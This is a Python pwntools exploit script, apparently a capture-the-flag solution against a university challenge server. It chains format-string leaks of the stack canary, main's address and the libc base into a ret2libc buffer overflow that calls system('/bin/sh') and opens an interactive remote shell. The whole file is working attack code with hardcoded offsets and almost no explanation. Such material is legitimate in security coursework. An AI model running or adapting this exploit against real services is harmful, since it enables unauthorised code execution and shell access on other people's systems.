from pwn import *

def exec_fmt(payload):
    r = process('./program')
    r.sendlineafter(b">", b"e")
    r.sendlineafter(b":", payload)
    result = r.recvline()
    r.kill()
    return result

# Format string attack preparation

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
info(f"FmtStr offset found!\n! {offset}")

# payload = fmtstr_payload(offset, {0x56558fb4 + 0x1c: 0x00004040})
# print("Payload:", payload)


def leak_canary(proc):
    """Returns the canary of the process as a 32-bit integer."""
    payload = b"%8$x"
    proc.sendlineafter(b">", b"e")
    proc.sendlineafter(b":", payload)
    canary = proc.recvline(keepends=False)
    proc.sendlineafter(b":", b"")
    return int(canary, 16)

def leak_main_addr(proc):
    """Returns the address of main as a 32-bit integer."""
    payload = b"%17$x"
    proc.sendlineafter(b">", b"e")
    proc.sendlineafter(b":", payload)
    addr = proc.recvline(keepends=False)
    proc.sendlineafter(b":", b"")
    return int(addr, 16)

def leak_libc_base_addr(proc):
    """Returns the base address of libc as a 32-bit integer."""
    OFFSET = 0xf7dac519 - 0xf7dab000 # %7$x - vmmap start

    payload = b"%11$x"
    proc.sendlineafter(b">", b"e")
    proc.sendlineafter(b":", payload)
    addr = proc.recvline(keepends=False)
    proc.sendlineafter(b":", b"")
    return int(addr, 16) - OFFSET
    

context.binary = "./program"


# Attack

# program = ELF("./program")

r = remote("ctf-fsi.fe.up.pt", 4002)

context.terminal = ["gnome-terminal", "--"]
# gdb.attach(r, gdbscript="ni 149")


canary = leak_canary(r)
info(f"Canary leaked!\n! {hex(canary)}")

main_addr = leak_main_addr(r)
info(f"Main address leaked!\n! {hex(main_addr)}")

libc_base_addr = leak_libc_base_addr(r) - 0x20000
info(f"Libc base address leaked!\n! {hex(libc_base_addr)}")

ret_addr = libc_base_addr + 0x00048150 # system (objdump -T libc.so.6)
info(f"Ret addr: {hex(ret_addr)}")
ret_arg_addr = main_addr + (0x00004040 - 0x000012ad) # buffer (objdump -t program)
payload = b"A" * 20 + p32(canary) + b"\0" * 8 + p32(ret_addr) + b"\0" * 4 + p32(ret_arg_addr)
print(payload)

r.sendlineafter(b">", b"e")
r.sendlineafter(b":", payload)
r.sendlineafter(b":", b"/bin/sh\0")

# for i in range(20):
#     r.sendlineafter(b">", b"e")
#     r.sendlineafter(b":", f"%{i + 7}$x".encode())
#     res = r.recvline(keepends=False)
#     print(f"{i + 7}: {res}")
#     r.sendlineafter(b":", b"")

r.interactive()
